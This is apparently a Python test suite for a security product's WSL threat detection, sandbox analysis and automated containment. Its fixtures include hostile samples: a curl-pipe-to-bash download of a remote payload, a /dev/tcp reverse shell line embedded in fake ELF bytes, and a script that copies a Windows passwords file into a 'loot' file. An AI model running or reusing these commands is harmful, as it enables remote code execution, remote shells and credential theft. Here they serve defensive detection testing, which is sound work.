"""
Monitorix Enterprise — WSL Threat Defense & Containment Test Suite
==================================================================
Comprehensive test suite validating:
1. Rule 9009 (WSL Defense Evasion & Abnormal Execution) AST Compilation
2. Sigma Rule 9009 Positive Threat Detection & MITRE T1202 Attribution
3. Rule 9009 Benign Negative Control Validation (Zero False Positives)
4. AI Copilot Rule 9009 Synthetic Fallback & Tactic Classification
5. Autonomous Security Guardrail Action Registration (terminate_wsl)
6. SOAR Agentless Engine WSL Remediation Command Generation (wsl.exe --shutdown)
7. SOAR Agent-Based Command Cryptographic Signing for WSL Termination
8. Autonomous Guardrail High-Impact Action Classification & Human Approval Gate
"""

import sys
import os
import time
import asyncio
from unittest.mock import AsyncMock, MagicMock, patch

# Add parent path for imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from app.services.detection.sigma_compiler import sigma_compiler
from app.services.detection.streaming_detector import evaluate_all
from app.services.detection.system_rules import get_system_rule_by_id, RESERVED_SYSTEM_RULE_IDS, is_system_rule
from app.services.ai_copilot import SYNTHETIC_RULES
from app.services.autonomous_security_service import (
    DEFAULT_ALLOWED_ACTIONS,
    HIGH_IMPACT_ACTIONS,
    AutonomousSecurityService
)
from app.services.agentless_engine import agentless_engine
from app.services.soar_engine import SoarEngine
from app.db.models import SoarActionExecution, AgentlessEndpoint, Agent, Tenant

PASSED = 0
FAILED = 0

def record_result(idx: int, title: str, passed: bool, duration_ms: float, details: str = ""):
    global PASSED, FAILED
    status = "[PASS]" if passed else "[FAIL]"
    if passed:
        PASSED += 1
    else:
        FAILED += 1
    det = f" {details}" if details else ""
    print(f"  {status} #{idx:02d}: {title} ({duration_ms:.2f}ms){det}")


async def run_tests():
    global PASSED, FAILED
    print("=" * 80)
    print("MONITORIX ENTERPRISE — WSL THREAT DEFENSE & CONTAINMENT VERIFICATION")
    print("================================================================================")

    # --------------------------------------------------------------------------
    # TEST 1: System Rule 9009 Registration & Metadata Verification
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    r9009 = get_system_rule_by_id(9009)
    p1 = (
        r9009 is not None and
        r9009["id"] == 9009 and
        9009 in RESERVED_SYSTEM_RULE_IDS and
        is_system_rule(9009) and
        r9009["severity"] == "Critical" and
        "T1202" in r9009["mitre_technique"]
    )
    d1 = (time.perf_counter() - t0) * 1000
    record_result(1, "Rule 9009 Reserved Registration & MITRE Metadata", p1, d1)

    # --------------------------------------------------------------------------
    # TEST 2: Rule 9009 AST Compilation into CompiledSigmaRule
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    compiled_9009 = sigma_compiler.compile(
        yaml_content=r9009["yaml_content"],
        rule_id=9009,
        metadata={
            "TenantId": None,
            "MitreTactic": r9009["mitre_tactic"],
            "MitreTechnique": r9009["mitre_technique"],
            "Category": r9009["category"],
            "Severity": r9009["severity"]
        }
    )
    p2 = (
        compiled_9009 is not None and
        compiled_9009.id == 9009 and
        compiled_9009.severity.lower() == "critical"
    )
    d2 = (time.perf_counter() - t0) * 1000
    record_result(2, "Rule 9009 Sigma AST Compilation", p2, d2)

    # --------------------------------------------------------------------------
    # TEST 3: Positive Detection — WSL Evasion Event Match
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    threat_event = {
        "event_type": "ProcessCreate",
        "Image": "C:\\Windows\\System32\\wsl.exe",
        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "CommandLine": "wsl.exe -e /bin/bash -c 'curl http://185.220.101.5/payload.elf | bash'",
        "wsl_evasion_detected": True,
        "AgentId": "AGENT-WSL-WIN11-01"
    }
    matches = evaluate_all(threat_event, [compiled_9009], authoritative_tenant_id=1)
    p3 = (
        len(matches) == 1 and
        matches[0].rule_id == 9009 and
        matches[0].severity == "Critical"
    )
    d3 = (time.perf_counter() - t0) * 1000
    record_result(3, "WSL Defense Evasion Positive Detection & Alert Generation", p3, d3)

    # --------------------------------------------------------------------------
    # TEST 4: Negative Control — Benign Developer WSL Execution
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    benign_event = {
        "event_type": "ProcessCreate",
        "Image": "C:\\Windows\\System32\\wsl.exe",
        "ParentImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe",
        "CommandLine": "wsl.exe -d Ubuntu -u dev cargo build",
        "wsl_evasion_detected": False,
        "AgentId": "AGENT-WSL-WIN11-01"
    }
    benign_matches = evaluate_all(benign_event, [compiled_9009], authoritative_tenant_id=1)
    p4 = (len(benign_matches) == 0)
    d4 = (time.perf_counter() - t0) * 1000
    record_result(4, "Benign Developer WSL Session Negative Control (Zero False Positives)", p4, d4)

    # --------------------------------------------------------------------------
    # TEST 5: AI Copilot Synthetic Rule 9009 Knowledge Mapping
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    copilot_rule = SYNTHETIC_RULES.get(9009)
    p5 = (
        copilot_rule is not None and
        copilot_rule["Severity"] == "Critical" and
        copilot_rule["MitreTechnique"] == "T1202" and
        copilot_rule["MitreTactic"] == "Defense Evasion"
    )
    d5 = (time.perf_counter() - t0) * 1000
    record_result(5, "AI Copilot Synthetic Rule 9009 Knowledge Mapping", p5, d5)

    # --------------------------------------------------------------------------
    # TEST 6: Autonomous Security Service Policy & Guardrail Configuration
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    p6 = (
        "terminate_wsl" in DEFAULT_ALLOWED_ACTIONS and
        "terminate_wsl" in HIGH_IMPACT_ACTIONS
    )
    d6 = (time.perf_counter() - t0) * 1000
    record_result(6, "Autonomous Policy Guardrails Action Registration (terminate_wsl)", p6, d6)

    # --------------------------------------------------------------------------
    # TEST 7: Agentless Remote WSL Termination via WinRM PowerShell Command
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    captured_commands = []
    
    async def mock_run_winrm(target_ip, db, cmd):
        captured_commands.append(cmd)
        return {"status": "ok"}

    with patch.object(agentless_engine, "_run_winrm_command", side_effect=mock_run_winrm):
        res1 = await agentless_engine.remediate_threat(
            target_ip="192.168.1.50",
            os_type="windows",
            action="terminate_wsl",
            target="malicious_target"
        )
        res2 = await agentless_engine.remediate_threat(
            target_ip="192.168.1.50",
            os_type="windows",
            action="terminate_wsl",
            target="Ubuntu-22.04"
        )

    p7 = (
        res1.get("status") == "remediated" and
        len(captured_commands) == 2 and
        captured_commands[0] == "wsl.exe --shutdown" and
        captured_commands[1] == "wsl.exe -t 'Ubuntu-22.04'"
    )
    d7 = (time.perf_counter() - t0) * 1000
    record_result(7, "SOAR Agentless WSL Termination Command Generation (wsl.exe --shutdown / -t)", p7, d7)

    # --------------------------------------------------------------------------
    # TEST 8: SOAR Action Execution Routing for WSL Containment
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    soar = SoarEngine()
    mock_db = AsyncMock()
    
    # Mock Agentless endpoint lookup
    agentless_ep = AgentlessEndpoint(
        Id=1,
        TenantId=1,
        IpAddress="10.0.0.45",
        Hostname="WIN-SRV-DEV",
        OsType="Windows"
    )
    
    mock_result = MagicMock()
    mock_result.scalars.return_value.first.return_value = agentless_ep
    mock_db.execute.return_value = mock_result

    execution = SoarActionExecution(
        Id=101,
        PlaybookId=1,
        TargetAgentId="10.0.0.45",
        ActionType="terminate_wsl",
        Status="Pending"
    )

    with patch.object(agentless_engine, "remediate_threat", return_value={"status": "remediated"}):
        await soar._execute_action(mock_db, execution, {"Distribution": "Ubuntu"})
        p8 = (execution.Status == "Success")

    d8 = (time.perf_counter() - t0) * 1000
    record_result(8, "SOAR Visual Playbook Automated Execution for WSL Containment", p8, d8)

    # --------------------------------------------------------------------------
    # TEST 9: Linux ELF Trojan Validation & Sandbox Analysis
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    from app.services.malware_analysis_service import MalwareAnalysisService
    
    # Construct simulated Linux ELF Trojan with reverse shell payload
    elf_trojan_bytes = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 16 + b"/bin/bash -i >& /dev/tcp/185.220.101.5/4444 0>&1"
    
    mock_db_sandbox = MagicMock()
    mock_db_sandbox.add = MagicMock()
    mock_db_sandbox.commit = AsyncMock()
    mock_db_sandbox.refresh = AsyncMock()
    
    with patch.object(MalwareAnalysisService, "seed_fixtures_if_empty", return_value=None):
        trojan_result = await MalwareAnalysisService.analyze_and_detonate_sample(
            payload_bytes=elf_trojan_bytes,
            filename="trojan_dropper.elf",
            submission_source="WSL_ENDPOINT_AGENT",
            submitting_agent_id="AGENT-WSL-01",
            environment="UBUNTU_2204_MICROVM",
            db=mock_db_sandbox
        )
    
    p9 = (
        trojan_result["file_type"] == "ELF64" and
        trojan_result["verdict"] == "MALICIOUS" and
        trojan_result["threat_score"] >= 60.0 and
        trojan_result["threat_family"] == "LinuxTrojan.ReverseShell" and
        trojan_result["quarantine_action"] == "ENFORCED_FLEET_HASH_BLOCK"
    )
    d9 = (time.perf_counter() - t0) * 1000
    record_result(9, "Linux ELF Trojan Sandbox Detonation & Automated Verdict", p9, d9, f"Score={trojan_result['threat_score']}, Family={trojan_result['threat_family']}")

    # --------------------------------------------------------------------------
    # TEST 10: WSL Cross-Boundary Filesystem Traversal Detection (/mnt/c/ Access)
    # --------------------------------------------------------------------------
    t0 = time.perf_counter()
    wsl_traversal_script = b"#!/bin/bash\ncat /mnt/c/Users/Administrator/Documents/passwords.txt > /tmp/loot.txt\n"
    
    with patch.object(MalwareAnalysisService, "seed_fixtures_if_empty", return_value=None):
        traversal_result = await MalwareAnalysisService.analyze_and_detonate_sample(
            payload_bytes=wsl_traversal_script,
            filename="exfil_wsl.sh",
            submission_source="WSL_ENDPOINT_AGENT",
            submitting_agent_id="AGENT-WSL-01",
            environment="UBUNTU_2204_MICROVM",
            db=mock_db_sandbox
        )
    
    p10 = (
        traversal_result["file_type"] == "SCRIPT" and
        traversal_result["threat_score"] >= 35.0 and
        any("T1083" in t for t in traversal_result["mitre_tactics"]) and
        "WSL_CrossBoundary_Host_Filesystem_Traversal" in traversal_result["yara_matches"]
    )
    d10 = (time.perf_counter() - t0) * 1000
    record_result(10, "WSL Cross-Boundary /mnt/c/ Filesystem Traversal Detection", p10, d10, f"Score={traversal_result['threat_score']}")

    print("=" * 80)
    print(f"WSL THREAT DEFENSE SUITE TOTAL: {PASSED + FAILED} | PASSED: {PASSED} | FAILED: {FAILED}")
    print("=" * 80)
    if FAILED > 0:
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(run_tests())

